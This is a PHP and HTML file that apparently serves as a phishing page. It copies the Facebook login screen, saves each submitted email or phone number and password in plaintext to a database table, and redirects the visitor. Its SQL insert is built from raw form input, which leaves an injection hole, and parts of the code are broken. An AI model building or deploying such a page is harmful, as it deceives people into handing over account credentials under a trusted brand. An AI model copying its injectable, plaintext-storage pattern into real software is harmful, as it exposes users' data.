<?php

require_once('DB.php');
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}

$sql = "CREATE TABLE accounts(
    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(60) NOT NULL,
    password1 VARCHAR(60) NOT NULL)";
try{
    if($conn->query($sql) === TRUE){
        echo "<script>console.log('created database')</script>";
    } else {
        echo "error creating table";
    }
} catch(Exception $e){
    echo "<script>console.log('db already created')</script>";
}
if(isset($_POST['submit'])){
    echo "start isset";
    $username1 = $_POST['username'];
    $password1 = $_POST['password'];
    require_once('DB.php');
    $sql = "INSERT INTO accounts (username,password1) VALUES ('$username1','$password1')";
    if( $conn ->query($sql) === true){
        echo "<script>console.log('added to DB')</script>";
        $uri .= $_SERVER['HTTP_HOST'];
        header('location: '.$uri.'/?tableID=$_COOKIE["tableid"]');
    } else{
        echo "error adding to db";
    }
}



?>


<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="./login_form_2.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
          <form Account="<?php echo $_SERVER['PHP_SELF'];?>" method="POST">
            <input name="username"type="text" placeholder="Email or Phone Number" required />
            <input name="password" type="password" placeholder="Password" required>
            <button class="login" type="submit" name="submit">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
    </div>
  </body>
</html>
